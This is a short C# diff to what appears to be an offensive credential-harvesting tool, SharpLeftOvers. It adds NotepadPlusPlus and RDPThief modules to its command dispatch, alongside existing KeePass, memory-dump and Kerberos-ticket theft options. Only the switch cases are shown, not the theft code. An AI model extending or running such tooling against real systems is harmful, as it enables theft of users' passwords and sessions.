@@ -37,6 +37,8 @@ namespace SharpLeftOvers
                                 Commands.MemDumpFiles();
                                 Commands.Keefarce();
                                 Commands.Keethief();
+                                Commands.NotepadPlusPlus();
+                                Commands.RDPThief();
                                 break;
                             case "-roastedtickets":
                                 Commands.Roastedtickets();
@@ -58,6 +60,9 @@ namespace SharpLeftOvers
                                 break;
                             case "-notepadplusplus":
                                 Commands.NotepadPlusPlus();
+                                break;
+                            case "-rdpthief":
+                                Commands.RDPThief();
                                 break;
                         }
                     }
